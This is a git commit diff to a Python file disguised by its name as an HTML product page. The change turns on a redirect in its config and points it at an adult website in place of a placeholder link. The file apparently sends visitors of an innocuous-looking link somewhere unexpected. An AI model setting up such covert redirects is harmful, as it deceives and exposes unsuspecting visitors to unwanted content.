42d1bb6b8ff3eab3b1607fcd23b32e637025436a
vhixgs <lucaberca99@gmail.com>
2025-07-26 00:51:56 +0300

    Update mango-rochie-maxi-strawberry-m9121c7kh-j11.html.py

--- api/mango-rochie-maxi-strawberry-m9121c7kh-j11.html.py
+++ api/mango-rochie-maxi-strawberry-m9121c7kh-j11.html.py
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.pornhub.com" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
